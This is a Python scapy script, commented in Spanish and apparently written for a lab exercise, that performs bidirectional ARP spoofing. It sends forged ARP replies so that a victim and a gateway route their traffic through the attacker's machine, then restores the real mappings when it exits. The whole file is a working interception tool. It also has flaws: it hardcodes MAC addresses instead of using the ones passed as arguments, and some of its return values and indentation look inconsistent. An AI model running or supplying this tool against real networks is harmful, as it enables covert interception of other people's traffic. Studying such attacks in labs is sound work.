from scapy.all import  Ether, ARP, Padding, conf
import time
import re
import argparse

import socket

MI_MAC ="52:54:00:b1:ee:2c"
VICTIMA_MAC ="52:54:00:9d:9b:46"
GATEWAY_MAC ="52:54:00:ae:c4:9f"

def validate_mac(mac):
    if mac.strip() == "":
        print("[!] MAC vacía"); return -1
    
    if re.search("[^a-zA-Z0-9:]", mac):
        print(f"[!] MAC '{mac}': caracteres inválidos (solo hex y ':')"); return -1
    
    partes = []
    parte = ""

    for i in mac+":":
        if i!=":":
            parte+=i
            if len(parte)>2:
                print(f"[!] MAC '{mac}': un octeto tiene más de 2 dígitos"); return -1
        else:
            partes.append(parte)
            parte = ""
    if len(partes)!=6:
        print(f"[!] MAC '{mac}': debe tener exactamente 6 octetos"); return -1
    else:
        return 1

def validate_ipv4(ip):  # -1 si es invalido
    # solo una barra
    if ip.count("/") != 1:
        print(f"[!] '{ip}': falta la máscara, usá formato x.x.x.x/x"); return -1
    # tiene que tener si o si 3 puntos
    if ip.count(".") != 3:
        print(f"[!] '{ip}': no es IPv4 válida (debe tener 4 octetos)"); return -1
    # no puede haber letras
    if re.search("[a-zA-Z]", ip):
        print(f"[!] '{ip}': contiene letras"); return -1
    posi = ip.index("/")
    return ip[:posi]
    

def validat_args():
    p = argparse.ArgumentParser(description="ARP spoofing")
    p.add_argument("-i", "--iface", required=True)
    p.add_argument("-iv", "--ivictima", required=True, help="x.x.x.x/x")
    p.add_argument("-mv", "--mvictima", required=True )
    p.add_argument("-ig", "--igateway", required=True, help="x.x.x.x/x" )
    p.add_argument("-mg", "--mgateway", required=True)
    p.add_argument("-r", "--rate", type=float, default=10, help="paquetes por segundo")
    p.add_argument("-d", "--duration", type=float, default=0, help="segundos; 0 = infinito")
    args = p.parse_args()
    return args

def validate_ip_base(ip):  
    mascara_idx = ip.index("/")  # busco donde comienza la barra
    try:
        mascara = int(ip[mascara_idx + 1 :])  # solo el numero de la mascara
    except ValueError:
        print(f"[!] '{ip}': la máscara no es un número"); return -1
    
    ipv4 = ip[:mascara_idx]  # solo la parte de la ip

    # OPTIMIZACIÓN: Separamos los octetos directamente usando split
    try:
        octetos = [int(x) for x in ipv4.split(".")]
    except ValueError:
        # Por si hay puntos consecutivos o formatos extraños como '10..0.1'
        print(f"[!] '{ip}': octetos inválidos"); return -1

    # Validamos que los 4 octetos estén en el rango correcto (0-255)
    for octeto in octetos:
        if octeto < 0 or octeto > 255:
            print(f"[!] '{ip}': octeto fuera de rango (0-255)"); return -1

    # la mascara no puede ser menor q 0 ni mayor qq 32
    if mascara > 32 or mascara < 0:  
         print(f"[!] '{ip}': máscara fuera de rango (0-32)"); return -1

    match octetos[0]:
        case 10:
            if mascara < 8:  # CORRECCIÓN: La red de clase A privada (10.0.0.0) empieza en /8
                print(f"[!] '{ip}': máscara incoherente para esa clase privada"); return -1.
        case 172:
            if octetos[1] < 16 or octetos[1] > 31:  # segundo octeto entre 16-31
                print(f"[!] '{ip}': máscara incoherente para esa clase privada"); return -1.
            if mascara < 12:  # la mascara no puede ser menor a 12
                print(f"[!] '{ip}': máscara incoherente para esa clase privada"); return -1.
        case 192:
            if octetos[1] != 168:  # el 2do octeto debe ser 168
                print(f"[!] '{ip}': máscara incoherente para esa clase privada"); return -1.
            if mascara < 16:  # la mascara no puede ser menor a 16
                print(f"[!] '{ip}': máscara incoherente para esa clase privada"); return -1.
        case _:  # cualquier otro caso es invalido porque no es privada
             print(f"[!] '{ip}': no es una IP privada (RFC1918)"); return -1
# --- AQUÍ COMIENZA LA OPERACIÓN AND ---
    
    # 1. Convertimos los 4 octetos en un solo número entero de 32 bits
    ip_int = (octetos[0] << 24) | (octetos[1] << 16) | (octetos[2] << 8) | octetos[3]
    
    # 2. Generamos la máscara en formato de 32 bits
    # Ejemplo para /24: Desplaza 32 unos hacia la izquierda (32-24=8 veces)
    mascara_int = (0xFFFFFFFF << (32 - mascara)) & 0xFFFFFFFF
    
    # 3. HACEMOS LA OPERACIÓN AND BIT A BIT
    ip_base_int = ip_int & mascara_int
    
    # 4. Volvemos a separar el número de 32 bits en 4 octetos
    oct1 = (ip_base_int >> 24) & 255
    oct2 = (ip_base_int >> 16) & 255
    oct3 = (ip_base_int >> 8) & 255
    oct4 = ip_base_int & 255
    
    ip_base_str = f"{oct1}.{oct2}.{oct3}.{oct4}"

    # Retorna la IP base calculada y la máscara
    return mascara, ip_base_str

def create_packet(mi_mac, ip_victima, mac_victima, ip_robada):
     """Arma un ARP reply (op=2) que dice 'ip_robada is-at mi_mac'.
    La MENTIRA es hwsrc=mi_mac: hace que el receptor mande a nuestra MAC
    el tráfico destinado a ip_robada. Para RESTAURAR se llama con la MAC
    real en vez de la nuestra."""
    relleno = b"\x00" * 18 # pad a 60 bytes (frame Ethernet mínimo)
        
    packet = (
        Ether(src=mi_mac, dst=mac_victima)
        / ARP(
            op=2,
            psrc=ip_robada,
            pdst=ip_victima,
            hwdst=mac_victima,
            hwsrc=mi_mac
        )
        / Padding(load=relleno)
    )
    return packet

def get_timer(args):
    return 1 / args.rate


def start():
    args = validat_args()
    red_victima = args.ivictima
    mac_victima = args.mvictima
    red_gateway = args.igateway
    mac_gateway = args.mgateway

    resultado1 = validate_ipv4(red_victima)
    resultado2 = validate_ipv4(red_gateway)


    if resultado2 == -1 or resultado1 == -1:
        return

    ip_victima = resultado1
    ip_gateway = resultado2

    resultado3 = validate_mac(mac_victima)
    resultado4 = validate_mac(mac_gateway)
    if resultado3 == -1 or resultado4 == -1:
        return
    
    resultado5 = validate_ip_base(red_victima)
    resultado6 = validate_ip_base(red_gateway)
    if resultado5 == -1 or resultado6 == -1:
        return 
    mascara_victima, ip_base_victima = resultado5
    mascara_gateway, ip_base_gateway = resultado6

    if mascara_gateway != mascara_victima or ip_base_gateway != ip_base_victima:
        print("[!] víctima y gateway no están en la misma subred, abortando"); return
    

    if args.duration != 0:
        fin = time.time() + args.duration
    cont = 0
    timer = get_timer(args)

    s = conf.L2socket(iface=args.iface)   # abrís el socket UNA vez
    packet_1 = create_packet(MI_MAC, ip_victima,VICTIMA_MAC, ip_gateway) # packet_1 envenena a la víctima (le dice que el gateway está en nuestra MAC)
    packet_2 = create_packet(MI_MAC, ip_gateway, GATEWAY_MAC, ip_victima) # packet_2 envenena al gateway (le dice que la víctima está en nuestra MAC)
    # -> MITM bidireccional; el reenvío lo hace el kernel con ip_forward=1
 
    try:
        while True:
            if args.duration != 0 and time.time() >= fin:
                break
            s.send(packet_1)                # mandás por el socket ya abierto
            s.send(packet_2)
            cont += 1
            time.sleep(timer)
    except KeyboardInterrupt:
        pass
    finally:
        # RESTAURACIÓN: mandamos los mapas VERDADEROS varias veces porque ARP
        # es best-effort (sin ACK) y queremos que la última palabra sea la real.
        packet_1_restaurador = create_packet(GATEWAY_MAC, ip_victima,VICTIMA_MAC, ip_gateway)
        packet_2_restaurador = create_packet(VICTIMA_MAC, ip_gateway,GATEWAY_MAC, ip_victima)
        for i in range(5):
            s.send(packet_1_restaurador)
            time.sleep(0.2)
            s.send(packet_2_restaurador)
            time.sleep(0.2)
        s.close()  


if __name__ == "__main__":
      start()


